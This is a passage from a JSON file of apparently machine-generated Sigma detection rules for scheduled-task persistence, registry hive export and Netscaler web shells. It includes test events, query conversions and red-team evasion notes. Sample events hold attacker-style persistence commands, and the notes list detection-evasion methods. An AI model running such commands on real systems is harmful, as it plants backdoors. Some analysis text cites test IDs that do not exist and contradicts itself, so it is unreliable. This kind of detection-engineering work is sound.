+        "splunk": "Image=\"*\\\\schtasks.exe\" CommandLine=\"*/create*\" CommandLine=\"*/sc*\" CommandLine=\"*onlogon*\" NOT (ParentImage IN (\"*\\\\mmc.exe\", \"*\\\\taskschd.msc\") OR (ParentImage IN (\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\", \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\") Image=\"*\\\\schtasks.exe\" CommandLine=\"*Microsoft\\\\Office\\\\Office Performance Monitor*\") OR (ParentImage=\"*\\\\wuauclt.exe\" CommandLine=\"*Microsoft\\\\Windows\\\\WindowsUpdate\\\\*\") OR (ParentImage IN (\"*\\\\policyplatform.exe\", \"*\\\\sscmsvc.exe\", \"*\\\\intuneextensionservice.exe\") CommandLine=\"*/create /tn *\"))",
+        "elasticsearch": "(Image:*\\\\schtasks.exe AND (CommandLine:*\\/create* AND CommandLine:*\\/sc* AND CommandLine:*onlogon*)) AND (NOT ((ParentImage:(*\\\\mmc.exe OR *\\\\taskschd.msc)) OR ((ParentImage:(\"C\\:\\\\Program Files\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\" OR \"C\\:\\\\Program Files \\(x86\\)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\")) AND Image:*\\\\schtasks.exe AND CommandLine:*Microsoft\\\\Office\\\\Office\\ Performance\\ Monitor*) OR (ParentImage:*\\\\wuauclt.exe AND CommandLine:*Microsoft\\\\Windows\\\\WindowsUpdate\\\\*) OR ((ParentImage:(*\\\\policyplatform.exe OR *\\\\sscmsvc.exe OR *\\\\intuneextensionservice.exe)) AND CommandLine:*\\/create\\ \\/tn\\ *)))",
+        "kusto": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\schtasks.exe\" and (ProcessCommandLine contains \"/create\" and ProcessCommandLine contains \"/sc\" and ProcessCommandLine contains \"onlogon\")) and (not(((InitiatingProcessFolderPath endswith \"\\\\mmc.exe\" or InitiatingProcessFolderPath endswith \"\\\\taskschd.msc\") or ((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\", \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\")) and FolderPath endswith \"\\\\schtasks.exe\" and ProcessCommandLine contains \"Microsoft\\\\Office\\\\Office Performance Monitor\") or (InitiatingProcessFolderPath endswith \"\\\\wuauclt.exe\" and ProcessCommandLine contains \"Microsoft\\\\Windows\\\\WindowsUpdate\\\\\") or ((InitiatingProcessFolderPath endswith \"\\\\policyplatform.exe\" or InitiatingProcessFolderPath endswith \"\\\\sscmsvc.exe\" or InitiatingProcessFolderPath endswith \"\\\\intuneextensionservice.exe\") and ProcessCommandLine contains \"/create /tn \"))))",
+        "sqlite": "SELECT * FROM logs WHERE (Image LIKE '%\\\\schtasks.exe' ESCAPE '\\' AND (CommandLine LIKE '%/create%' ESCAPE '\\' AND CommandLine LIKE '%/sc%' ESCAPE '\\' AND CommandLine LIKE '%onlogon%' ESCAPE '\\')) AND (NOT COALESCE(((ParentImage LIKE '%\\\\mmc.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\taskschd.msc' ESCAPE '\\') OR ((ParentImage LIKE 'C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe' ESCAPE '\\' OR ParentImage LIKE 'C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe' ESCAPE '\\') AND Image LIKE '%\\\\schtasks.exe' ESCAPE '\\' AND CommandLine LIKE '%Microsoft\\\\Office\\\\Office Performance Monitor%' ESCAPE '\\') OR (ParentImage LIKE '%\\\\wuauclt.exe' ESCAPE '\\' AND CommandLine LIKE '%Microsoft\\\\Windows\\\\WindowsUpdate\\\\%' ESCAPE '\\') OR ((ParentImage LIKE '%\\\\policyplatform.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\sscmsvc.exe' ESCAPE '\\' OR ParentImage LIKE '%\\\\intuneextensionservice.exe' ESCAPE '\\') AND CommandLine LIKE '%/create /tn %' ESCAPE '\\')), 0))"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "8 evasion variants -> positives 7/7, negatives blocked 7/7, benign hits 0/1200",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "Positive variants P4-P7 demonstrate realistic operator evasions: parameter reordering, extra whitespace, mixed casing, single vs double quotes, UNC target paths, environment variables in arguments, SysWOW64 vs System32 paths, and varied parent processes (cmd.exe, powershell.exe, wscript.exe). All preserve the three required substrings (/create, /sc, onlogon) in CommandLine and keep Image ending with schtasks.exe, so a well-written rule catches them. Negative variants N1-N4 are benign look-alikes that match the selection but are explicitly filtered by the rule's four filter_* clauses (mmc.exe parent, Office integrator path, wuauclt.exe parent, SCCM/Intune parents with /create /tn pattern). Each negative differs in ParentImage and/or CommandLine content from the positives. Out-of-scope variants OOS1-OOS3 represent evasions the current logsource/rule cannot reliably detect: OOS1 renames the binary (rule keys on Image suffix, no OriginalFileName field); OOS2 bypasses schtasks entirely using Task Scheduler COM APIs (no schtasks.exe process); OOS3 hides 'onlogon' behind an environment variable (sensor records literal %TRIGGER_TYPE%, not expanded value). These are reported for analyst awareness; the rule is not expected to match them without additional telemetry.",
+      "retired_tests": [],
+      "replaced_tests": [],
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Renamed schtasks.exe (evil.exe) with OriginalFileName still schtasks.exe - rule keys on Image ending with schtasks.exe so renamed binary evades detection",
+          "event": {
+            "Image": "C:\\Windows\\Temp\\evil.exe",
+            "CommandLine": "evil.exe /create /sc onlogon /tn \"Backdoor\" /tr \"C:\\Windows\\Temp\\payload.dll\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "CORP\\attacker"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Attacker uses Task Scheduler COM API directly via PowerShell (RegisterTaskDefinition) - no schtasks.exe process creation at all",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"$task = New-ScheduledTaskAction -Execute 'C:\\Windows\\System32\\rundll32.exe'; Register-ScheduledTask -TaskName 'Persist' -Action $task -Trigger (New-ScheduledTaskTrigger -AtLogOn)\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "CORP\\attacker"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Attacker uses schtasks.exe but with /sc onlogon split across environment variable expansion (sensor records literal %VAR%) - rule needs literal 'onlogon' in CommandLine",
+          "event": {
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /sc %TRIGGER_TYPE% /tn \"Task\" /tr \"C:\\Windows\\Temp\\evil.dll\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "CORP\\attacker"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D3",
+      "title": "Export of SYSTEM and User Registry Hives",
+      "sigma_yaml": "title: Export of SYSTEM and User Registry Hives\nid: 3b9e0242-1c17-463f-972b-7385b5c2bc12\nstatus: experimental\ndescription: 'Detects attempts to export critical registry hives (SYSTEM and HKCU\\Software) which is indicative of credential\n  and configuration harvesting by threat actors.'\nreferences:\n- 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.discovery\n- attack.t1012\nlogsource:\n  category: registry_set\n  product: windows\ndetection:\n  selection_target:\n    'TargetObject|endswith':\n    - '\\SYSTEM'\n    - '\\Software'\n  condition: selection_target\nfalsepositives:\n- Legitimate backup or recovery operations exporting registry hives using known tools like Windows Backup, Veeam, or system\n  restore utilities.\nlevel: medium\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1012"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Export of SYSTEM hive via reg save command",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SYSTEM",
+            "Details": "Binary RegSaveKey",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Export of HKCU Software hive via reg save command",
+          "event": {
+            "TargetObject": "\\REGISTRY\\USER\\S-1-5-21-1234567890-123456789-1234567890-1001\\Software",
+            "Details": "Binary RegSaveKey",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Alternative casing and path variation for SYSTEM hive export",
+          "event": {
+            "TargetObject": "\\registry\\machine\\system",
+            "Details": "Binary RegSaveKey",
+            "Image": "C:\\Windows\\SysWOW64\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate modification of a non-sensitive registry key",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "Details": "DWORD (0x00000001)",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Backup software accessing registry for legitimate purposes",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Veeam",
+            "Details": "DWORD (0x00000001)",
+            "Image": "C:\\Program Files\\Veeam\\Backup and Replication\\VeeamAgent.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "System update modifying registry hive non-maliciously",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SYSTEM\\Setup",
+            "Details": "DWORD (0x00000001)",
+            "Image": "C:\\Windows\\System32\\msiexec.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Export of HKCU Software hive with lowercase path and different user SID (Local System)",
+          "event": {
+            "TargetObject": "\\REGISTRY\\USER\\S-1-5-18\\software",
+            "Details": "Binary RegSaveKey",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Export of SYSTEM hive via reg.exe from SysWOW64 with RegSaveKeyEx detail",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SYSTEM",
+            "Details": "RegSaveKeyEx",
+            "Image": "C:\\Windows\\SysWOW64\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Export of HKCU Software hive using mixed-case registry root and alternate detail string",
+          "event": {
+            "TargetObject": "\\registry\\user\\S-1-5-21-987654321-987654321-987654321-1002\\Software",
+            "Details": "Binary RegSaveKey",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Export of SYSTEM hive with reg.exe invoked from a non-standard but valid system directory",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SYSTEM",
+            "Details": "Binary RegSaveKey",
+            "Image": "C:\\Windows\\WinSxS\\amd64_microsoft-windows-reg.exe_31bf3856ad364e35_10.0.19041.1_none_abc123\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "negative",
+          "description": "Legitimate backup software (Veeam) exporting SAM hive – TargetObject does not end with SYSTEM or Software",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SAM",
+            "Details": "Binary RegSaveKey",
+            "Image": "C:\\Program Files\\Veeam\\VeeamBackup.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Administrator querying a subkey under SOFTWARE – TargetObject ends with CurrentVersion, not Software",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
+            "Details": "Binary RegQueryValue",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "EventType": "RegSetValue"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "System restore utility exporting a backup copy of SYSTEM hive – TargetObject ends with Backup",
+          "event": {
+            "TargetObject": "\\REGISTRY\\MACHINE\\SYSTEM\\Backup",
+            "Details": "Binary RegSaveKey",
+            "Image": "C:\\Windows\\System32\\wbemtest.exe",
+            "EventType": "RegSetValue"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D3",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE TargetObject LIKE '%\\\\SYSTEM' ESCAPE '\\' OR TargetObject LIKE '%\\\\Software' ESCAPE '\\'",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 7,
+        "positives_matched": 7,
+        "negatives_total": 6,
+        "negatives_matched": 0,
+        "benign_total": 160,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "TargetObject IN (\"*\\\\SYSTEM\", \"*\\\\Software\")",
+        "elasticsearch": "TargetObject:(*\\\\SYSTEM OR *\\\\Software)",
+        "kusto": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SYSTEM\" or RegistryKey endswith \"\\\\Software\"",
+        "sqlite": "SELECT * FROM logs WHERE TargetObject LIKE '%\\\\SYSTEM' ESCAPE '\\' OR TargetObject LIKE '%\\\\Software' ESCAPE '\\'"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/160",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "7 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/160",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "The rule keys solely on TargetObject ending with '\\SYSTEM' or '\\Software'. All positive variants preserve those suffixes while varying casing, registry root, user SID, Image path, and Details strings – changes a well-written rule on the registry_set logsource can still catch because the suffix match is case-insensitive and path-agnostic. Negative variants are benign operations that touch registry hives but target different keys (SAM, subkeys of SOFTWARE, SYSTEM\\Backup), so they correctly fail the suffix check. Out-of-scope evasions (direct disk reads, kernel memory access) produce no registry_set telemetry at all; the rule cannot see them, and they are reported for analyst awareness rather than as test cases.",
+      "retired_tests": [],
+      "replaced_tests": [],
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Attacker reads hive files directly from disk via Volume Shadow Copy – no registry_set event is generated",
+          "event": {
+            "EvasionMethod": "DirectDiskRead",
+            "TargetObject": "N/A (no registry event)",
+            "Details": "N/A",
+            "Image": "N/A",
+            "EventType": "N/A"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Attacker uses a kernel driver to parse registry hives from memory – bypasses registry API entirely",
+          "event": {
+            "EvasionMethod": "KernelMemoryRead",
+            "TargetObject": "N/A (no registry event)",
+            "Details": "N/A",
+            "Image": "N/A",
+            "EventType": "N/A"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D4",
+      "title": "Citrix Netscaler Specific Web Shell Deployment",
+      "sigma_yaml": "title: Citrix Netscaler Specific Web Shell Deployment\nid: bb514c03-f406-47f2-9b65-91bcd5917cc5\nstatus: experimental\ndescription: 'Detects creation of known malicious web shell files associated with Citrix Netscaler compromise: version.dll,\n  ctxHeaderLogon.php, and netscaler.php. These files are not part of legitimate Netscaler installations and indicate persistence\n  mechanisms used by threat actors.'\nreferences:\n- 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.persistence\n- attack.t1505.003\nlogsource:\n  category: file_event\n  product: windows\ndetection:\n  selection_shell_dll:\n    'TargetFilename|endswith': '\\version.dll'\n  selection_shell_php1:\n    'TargetFilename|endswith': '\\ctxHeaderLogon.php'\n  selection_shell_php2:\n    'TargetFilename|endswith': '\\netscaler.php'\n  condition: selection_shell_dll or selection_shell_php1 or selection_shell_php2\nfalsepositives:\n- Legitimate Citrix Netscaler firmware updates writing temporary files\n- Custom theme or certificate deployments using similar naming\n- Misconfigured monitoring or backup scripts creating test files\n- Administrative troubleshooting involving file creation in web directories\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1505.003"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Creation of version.dll backdoor on Netscaler appliance",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER01",
+            "CreationUtcTime": "2024-06-15T10:30:00Z",
+            "EventID": "11",
+            "Hashes": "SHA1=ABC123DEF456",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\version.dll",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-15T10:30:00.1234567Z"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Deployment of ctxHeaderLogon.php web shell",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER02",
+            "CreationUtcTime": "2024-06-15T14:22:00Z",
+            "EventID": "11",
+            "Hashes": "SHA1=XYZ789ABC123",
+            "TargetFilename": "C:\\netscaler\\portal\\templates\\ctxHeaderLogon.php",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-15T14:22:00.4567890Z"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Creation of netscaler.php persistence mechanism",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER03",
+            "CreationUtcTime": "2024-06-16T09:15:00Z",
+            "EventID": "11",
+            "Hashes": "SHA1=DEF456GHI789",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\vpns\\netscaler.php",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-16T09:15:00.7890123Z"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate Netscaler firmware update file creation",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER01",
+            "CreationUtcTime": "2024-06-15T03:00:00Z",
+            "EventID": "11",
+            "Hashes": "SHA1=AAAAAAAAAAAA",
+            "TargetFilename": "C:\\netscaler\\var\\tmp\\nsupdate_13.1-42.17.dll",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-15T03:00:00.1234567Z"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Custom theme deployment with similar naming",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER02",
+            "CreationUtcTime": "2024-06-15T11:30:00Z",
+            "EventID": "11",
+            "Hashes": "SHA1=BBBBBBBBBBBB",
+            "TargetFilename": "C:\\netscaler\\gateways\\templates\\custom_version.dll",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-15T11:30:00.4567890Z"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Administrative script creating test file during troubleshooting",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER03",
+            "CreationUtcTime": "2024-06-16T16:45:00Z",
+            "EventID": "11",
+            "Hashes": "SHA1=CCCCCCCCCCCC",
+            "TargetFilename": "C:\\temp\\debug\\netscaler_test.php",
+            "User": "CITRIX\\admin",
+            "UtcTime": "2024-06-16T16:45:00.7890123Z"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "version.dll created in Windows Temp directory by SYSTEM - different parent path but same filename suffix",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER04",
+            "CreationUtcTime": "2024-06-17T08:45:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=FEDCBA987654",
+            "TargetFilename": "C:\\Windows\\Temp\\version.dll",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-17T08:45:00.1111111Z"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "ctxHeaderLogon.php deployed on D: drive under Citrix folder by a service account - alternate drive letter and user",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER05",
+            "CreationUtcTime": "2024-06-17T12:10:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=1234567890AB",
+            "TargetFilename": "D:\\Citrix\\Netscaler\\portal\\ctxHeaderLogon.php",
+            "User": "NT AUTHORITY\\NETWORK SERVICE",
+            "UtcTime": "2024-06-17T12:10:00.2222222Z"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "netscaler.php created directly under wwwroot by a domain service account - shorter path, non-SYSTEM user",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER06",
+            "CreationUtcTime": "2024-06-18T03:22:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=ABCDEF123456",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\netscaler.php",
+            "User": "CORP\\svc_netscaler",
+            "UtcTime": "2024-06-18T03:22:00.3333333Z"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "version.dll dropped in ProgramData Citrix folder by SYSTEM - different system directory",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER07",
+            "CreationUtcTime": "2024-06-18T16:55:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=7890123456CD",
+            "TargetFilename": "C:\\ProgramData\\Citrix\\NetScaler\\version.dll",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-18T16:55:00.4444444Z"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "negative",
+          "description": "Legitimate Citrix firmware update writes temporary file version.dll.tmp - similar name but extra extension prevents match",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER01",
+            "CreationUtcTime": "2024-06-10T09:00:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=AAABBBCCC",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\version.dll.tmp",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-10T09:00:00.5555555Z"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Administrator backs up ctxHeaderLogon.php as ctxHeaderLogon.php.bak during maintenance - backup extension changes suffix",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER02",
+            "CreationUtcTime": "2024-06-11T14:30:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=BBCCDDEEE",
+            "TargetFilename": "C:\\netscaler\\portal\\templates\\ctxHeaderLogon.php.bak",
+            "User": "CORP\\admin_jsmith",
+            "UtcTime": "2024-06-11T14:30:00.6666666Z"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Monitoring script creates test file netscaler_test.php in vpns folder - prefix change prevents endswith match",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-",
+            "ComputerName": "NETSCALER03",
+            "CreationUtcTime": "2024-06-12T11:15:00Z",
+            "EventID": 11,
+            "Hashes": "SHA1=CCDDEEFFF",
+            "TargetFilename": "C:\\inetpub\\wwwroot\\vpns\\netscaler_test.php",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12T11:15:00.7777777Z"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D4",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE TargetFilename LIKE '%\\\\version.dll' ESCAPE '\\' OR TargetFilename LIKE '%\\\\ctxHeaderLogon.php' ESCAPE '\\' OR TargetFilename LIKE '%\\\\netscaler.php' ESCAPE '\\'",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 7,
+        "positives_matched": 7,
+        "negatives_total": 6,
+        "negatives_matched": 0,
+        "benign_total": 160,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "TargetFilename IN (\"*\\\\version.dll\", \"*\\\\ctxHeaderLogon.php\", \"*\\\\netscaler.php\")",
+        "elasticsearch": "TargetFilename:(*\\\\version.dll OR *\\\\ctxHeaderLogon.php OR *\\\\netscaler.php)",
+        "kusto": "DeviceFileEvents\n| where FolderPath endswith \"\\\\version.dll\" or FolderPath endswith \"\\\\ctxHeaderLogon.php\" or FolderPath endswith \"\\\\netscaler.php\"",
+        "sqlite": "SELECT * FROM logs WHERE TargetFilename LIKE '%\\\\version.dll' ESCAPE '\\' OR TargetFilename LIKE '%\\\\ctxHeaderLogon.php' ESCAPE '\\' OR TargetFilename LIKE '%\\\\netscaler.php' ESCAPE '\\'"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/160",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "7 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/160",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "Positive variants (P4-P7) demonstrate that the rule's endswith logic on TargetFilename correctly catches the malicious filenames across different parent directories, drive letters, user contexts, and system paths. The rule is resilient to path variability because it anchors on the final filename component. Negative variants (N1-N3) show benign administrative activities that create similarly named files but with additional extensions or prefixes; these do not satisfy the endswith condition and are correctly excluded. Out-of-scope variants (O1-O4) represent realistic evasion techniques an operator would use: case alteration (O1), 8.3 short-name generation (O2), double-extension masking (O3), and Unicode homoglyph substitution (O4). The current rule's case-sensitive endswith match does not capture these because the literal substrings '\\version.dll', '\\ctxHeaderLogon.php', '\\netscaler.php' are not present verbatim in TargetFilename. A well-written rule would employ case-insensitive matching, 8.3 name expansion, and normalization of Unicode lookalikes to cover these gaps. The logsource (file_event) records the exact TargetFilename as created, so all these evasions are visible to the sensor; the limitation lies in the rule's string-matching logic.",
+      "retired_tests": [],
